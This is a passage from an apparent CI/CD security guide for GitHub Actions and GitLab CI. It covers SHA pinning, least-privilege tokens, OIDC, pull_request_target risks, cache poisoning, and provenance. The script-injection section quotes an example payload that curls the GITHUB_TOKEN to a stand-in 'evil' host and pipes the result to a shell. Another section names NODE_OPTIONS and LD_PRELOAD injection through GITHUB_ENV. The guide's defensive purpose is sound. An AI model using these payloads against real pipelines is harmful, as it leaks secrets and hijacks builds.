# Validate workflow syntax
actionlint .github/workflows/*.yml
```

## Expert Practices: Idioms, Anti-Patterns & Gotchas

High-signal practices distilled from official platform docs and supply-chain incident research. Each carries the mechanism — the *why* is what makes the rule transfer to new situations.

### Security

**Pin third-party actions to a full commit SHA, never a tag or branch.** `uses: owner/action@v4` and `@main`/`@master` are mutable git refs: the maintainer (or an attacker who compromises the repo or a PAT) can force-push the tag/branch to different code, and every consumer silently runs it on the next trigger. This is the exact mechanism of tj-actions/changed-files (CVE-2025-30066, March 2025) — tags repointed to a single malicious commit that dumped runner memory (secrets) into logs across 23,000+ repos; trivy-action was hit similarly. A 40-char SHA is content-addressed (Git addresses objects by SHA-1 of their content) so it resolves to exactly one tree of bytes forever; a tag is just a named pointer with no such guarantee. `@main`/`@master` is the worst case — it advances on every push. Pair SHA pins with Dependabot/Renovate so you still get update PRs.

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8  # v0.24.0
# .github/dependabot.yml: { package-ecosystem: github-actions, directory: /, schedule: { interval: weekly } }
```

**Declare `permissions: {}` at workflow level, then grant per-job minimums.** A workflow with no `permissions` block inherits the repo default — read-only only for orgs/repos created after Feb 2023; older repos and many forks keep the permissive read-write default. Setting `{}` denies all GITHUB_TOKEN scopes; then, because **setting any one scope forces all unspecified scopes to `none`**, granting one scope per job locks the rest down. This bounds blast radius: a compromised action in a test job with no write scopes cannot push commits, alter workflows, or exfiltrate via the Actions API.

```yaml
permissions: {}   # deny all by default
jobs:
  test:
    steps: [ ... ]          # inherits empty set
  build:
    permissions: { contents: read, packages: write }   # only this job can push to GHCR
    steps: [ ... ]
```

**Replace long-lived cloud keys with OIDC, scoped to repo + ref/environment.** Stored AWS/GCP/Azure keys never expire and can't be scoped to a branch; they leak via logs, secret scanning, or insiders. OIDC mints a short-lived signed JWT per job (claims: subject, repo, ref, environment) that the cloud IAM trust policy verifies before returning temporary STS creds. The critical footgun is an over-broad trust policy: a `sub` of `repo:org/*` (or `StringLike`, or no `sub` check at all) lets any repo/branch — including a fork PR — assume the role. Scope `sub` with `StringEquals` to the exact ref/environment, e.g. `repo:org/repo:environment:production`. On GitHub the job needs `permissions: id-token: write` — omitting it makes the token request silently return empty and the action fails cryptically. On **GitLab (≥15.7)** use the `id_tokens` keyword with `aud`; `CI_JOB_JWT`/`CI_JOB_JWT_V2` were **removed in GitLab 17.0 (May 2024)** — pipelines relying on them break.

```yaml
# GitLab CI — OIDC, no stored keys (CI_JOB_JWT was removed in 17.0)
deploy:
  id_tokens:
    AWS_OIDC_TOKEN: { aud: https://sts.amazonaws.com }
  script:
    - aws sts assume-role-with-web-identity --role-arn "$ROLE_ARN"
        --web-identity-token "$AWS_OIDC_TOKEN" --role-session-name gitlab-$CI_JOB_ID
```

**Never use `pull_request_target` while checking out fork code — use the two-workflow split.** `pull_request_target` runs in the BASE repo context with a write-scoped token and full secret visibility, even for fork PRs. Adding `actions/checkout` with `ref: github.event.pull_request.head.sha` to "test the PR" materializes attacker code inside that privileged context, so any subsequent `npm install`/`make` runs attacker-controlled postinstall hooks with the write token and secrets in memory (a "pwn request" / Poisoned Pipeline Execution). The durable fix is a hard split: Workflow 1 (`on: pull_request`, `permissions: {}`) runs the untrusted code and uploads results as an artifact; Workflow 2 (`on: workflow_run`, has secrets/write) downloads that artifact and treats its contents as **untrusted data** — never executing it or writing it to `GITHUB_ENV`. (actions/checkout@v7, GA June 2026, refuses fork-PR checkout under `pull_request_target` by default, but the split is the durable mitigation.)

**Route untrusted context values through env vars to prevent script injection.** `${{ expression }}` is evaluated at workflow-*generation* time, BEFORE the shell parses `run:` — so the value is string-substituted into the script source. A user-controlled field (PR title, branch name, commit message) interpolated inline lets an attacker supply `a"; curl evil/$GITHUB_TOKEN | sh; echo "` which then executes. Assign the expression to an `env:` var and reference `"$VAR"`: the value lands in memory as a string before generation, and the shell resolves the variable *after* parsing, so metacharacters stay data. GitHub Security Lab treats any field ending in body/title/message/name/ref/label/head_ref/email/default_branch/page_name as untrusted.

```yaml
- name: Check PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}  # resolved before shell parses
  run: |
    [[ "$PR_TITLE" =~ ^feat ]] && echo "feature PR"
```

**Treat `GITHUB_ENV`/`GITHUB_PATH` writes of untrusted data as privilege escalation.** Distinct from script injection: here the command is safe but the DATA written is attacker-controlled. `GITHUB_ENV` sets env vars for all later steps, so piping untrusted content (a fork's `workflow_run` artifact, an API response) into it lets an attacker inject `NODE_OPTIONS=--require /evil` or `LD_PRELOAD`, hijacking subsequent steps; appending to `GITHUB_PATH` prepends malicious dirs for tool substitution; and a line matching `VAR<<DELIM ... DELIM` defines arbitrary vars via heredoc. Prefer `GITHUB_OUTPUT` (named key=value pairs only, no effect on the running shell's env) for passing values; validate/strip newlines; use a randomized heredoc delimiter (`EOF$(uuidgen)`) for legitimate multiline values.

**Secret log redaction is best-effort — register derived values explicitly.** Redaction matches EXACT registered secret values in stdout/stderr. It misses: (1) structured secrets — a JSON blob stored as one secret is matched only as the whole string, not an embedded token printed alone; (2) derived values — base64/JWT/concatenations are new, unregistered strings; (3) some tool stderr that bypasses the masking pipeline. Store decomposed scalar secrets, not blobs; call `echo "::add-mask::$DERIVED"` *before* emitting any output for values you derive; audit raw logs after testing with sensitive inputs. Redaction is a backstop, not a control.

**GitHub Actions cache crosses trust boundaries — don't restore caches in publish/release jobs.** The cache key namespace is shared across branches and is NOT isolated by privilege level, so a low-privilege `pull_request` workflow can write an entry that a high-privilege release job later restores (cache poisoning) — backdooring the published artifact, even one that then gets a valid SLSA attestation. In publish/release jobs, do NOT restore caches; reinstall fresh from the lock file (`npm ci`) so integrity is re-verified.

**Use ephemeral self-hosted runners; avoid self-hosted runners on public repos.** Persistent runners retain workspace files, env vars, and cached credentials between jobs — a later job (including a fork PR job on a public repo) can read and exfiltrate them. GitHub's guidance: no self-hosted runners on public repos; for private/internal use just-in-time (`--ephemeral`) runners provisioned per job and destroyed after one use (via the registration API or Actions Runner Controller `ephemeral: true`).

### Idioms

**Generate SLSA provenance for release artifacts — but know its limits.** `actions/attest-build-provenance` (GA June 2024) uses Sigstore to bind an artifact's digest to the workflow run, repo, commit, and trigger, reaching SLSA Build L2 out of the box; consumers verify with `gh attestation verify`. Required: `id-token: write` (mint the Sigstore cert) and `attestations: write` (persist it) — missing either fails, often only surfacing at verification. **Crucial nuance:** provenance attests build *identity*, not input *cleanliness* — it signs whatever the workflow produced, including an artifact built from a poisoned cache. Pair it with lock-file install (`npm ci`), no cache restore in the publish job, and SHA-pinned actions. Prefer `actions/attest-build-provenance` over the older generic `actions/attest`.

**Add SBOM and explicit provenance to Docker images with build-push-action v6+; never pass secrets via `--build-arg`.** Since v4, provenance attestations are added automatically (public repos `mode=max`, private `mode=min`); SBOM is NOT automatic — set `sbom: true`. Both require pushing to a registry and are incompatible with `load: true`. Security gotcha: build args appear in `mode=max` provenance on public repos, so pass secrets via BuildKit secret mounts (`secrets:`), never `build-args`. Current major is v6 (v7 available 2026); pin to a SHA regardless.

```yaml
- uses: docker/build-push-action@<sha>  # v6
  with:
    context: .
    push: true
    provenance: mode=max
    sbom: true
    secrets: |
      MY_SECRET=${{ secrets.MY_SECRET }}   # secret mount, NOT --build-arg
```

**Lint workflows with actionlint and zizmor in CI.** Generic YAML linters can't see Actions semantics. `actionlint` type-checks workflow expressions, validates action inputs, and runs ShellCheck on `run:` scripts. `zizmor` flags supply-chain risks (unpinned third-party refs), over-broad `permissions`, and expression injection (it excludes official GitHub actions from its pinning rule to cut false positives). Run both as a CI step or pre-commit — cheap, high-leverage, complementary to SHA-pinning and least-privilege.

### Design Patterns

**Build artifacts once and promote the same bytes by digest; never rebuild per environment.** Rebuilding a container/binary separately for staging and prod is non-deterministic — base-image digests, transitive deps, and compiler output can differ between builds of the same source SHA, so what you validated in staging is not what reaches prod. The "Continuous Delivery" (Humble & Farley) immutable-artifact principle: build once, capture the content-addressed digest, promote that exact digest. A registry tag (`v1.2.3`) is a mutable pointer; a digest (`sha256:...`) is immutable. SLSA provenance binds to the digest, so promoting by digest preserves the chain of custody.

```yaml
- name: Deploy by immutable digest (not the tag)
  run: kubectl set image deployment/app app=ghcr.io/org/app@${{ steps.build.outputs.digest }}
```

**Trunk-based development is a prerequisite for true CI, not a naming convention.** DORA/Accelerate research found trunk-based development (integrating to mainline daily via short-lived branches) is a statistically significant predictor of elite delivery. A pipeline validating an isolated long-lived branch only catches integration failures at merge time, not continuously — so CI in the Humble/Farley sense requires every developer's code to reach mainline at least daily. Implications: optimize the trunk gate for fast feedback (target sub-5-minute fast checks) and use feature flags to decouple deploy from release so incomplete features can merge to trunk unseen. Running CI primarily on a long-lived `develop` branch does not achieve CI.

### Gotchas

**Concurrency: cancel-in-progress for CI, `false` for deployments.** `cancel-in-progress: true` is correct for lint/test (aborting a stale run wastes nothing). On DEPLOYMENT jobs it's dangerous — cancelling a mid-flight rollout (a 50%-complete Kubernetes rollout, a half-applied migration) leaves mismatched versions or partial state. Use the same group key with `cancel-in-progress: false` so deploys queue. Two nuances: (1) with `false`, a group holds at most one running + one pending — a third trigger cancels the PENDING job, never the running one; (2) include `github.workflow` in the group key so an unprefixed ref-based key doesn't cancel unrelated workflows.

```yaml
# CI
concurrency: { group: "ci-${{ github.workflow }}-${{ github.head_ref || github.ref }}", cancel-in-progress: true }
# Deploy — queue, never interrupt a live rollout
concurrency: { group: "deploy-${{ github.workflow }}-production", cancel-in-progress: false }
```

**GitLab CI: use `rules:` + `workflow:rules`, never mix with `only/except`; suppress duplicate pipelines.** (1) Mixing `only/except` and `rules:` across jobs in one pipeline is unsupported — GitLab processes them separately, producing unpredictable job inclusion; migrate everything to `rules:`. (2) When a job has both an MR-event rule and a branch rule, a push to a branch with an open MR triggers BOTH a detached merge-request pipeline and a branch pipeline — doubling runner load. The canonical fix is a global `workflow:rules` that suppresses the branch pipeline when an MR is open, keyed on `$CI_OPEN_MERGE_REQUESTS`.

```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never                                   # suppress duplicate branch pipeline
    - if: $CI_COMMIT_BRANCH
```

**GitHub Actions cache key: scope by `runner.os`, key on the lock file, keep restore-keys narrow.** (1) Omitting `runner.os` lets Linux and macOS share a cache — native/compiled binaries built for one OS fail on the other. (2) Keying on source (`hashFiles('**/*.ts')`) misses the cache on every code change; key on the dependency LOCK file (`package-lock.json`, `Cargo.lock`), which changes only when deps change. (3) `restore-keys` are prefix-matched by recency, so a too-broad fallback can restore an arbitrary stale/incompatible cache — keep the prefix specific.

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-npm-
```

**`type=gha` Docker cache requires Buildx and silently no-ops otherwise.** The `type=gha` BuildKit backend is NOT supported by the default `docker` driver on GitHub-hosted runners — it needs a `docker-container`/`docker-buildx` builder. Without `docker/setup-buildx-action` before `docker/build-push-action`, `cache-from`/`cache-to: type=gha` are silently ignored: zero read, zero write, no error. Also: `BUILDKIT_INLINE_CACHE=1` is a build-arg for the *registry* inline-cache mechanism — it has no effect with `type=gha` and just adds confusion; and multiple image builds in one job sharing the default scope overwrite each other's cache, so give each a distinct `scope=`.

```yaml
- uses: docker/setup-buildx-action@<sha>   # REQUIRED before the gha backend
- uses: docker/build-push-action@<sha>     # v6
  with:
    cache-from: type=gha,scope=api
    cache-to: type=gha,mode=max,scope=api   # distinct scope per image
```
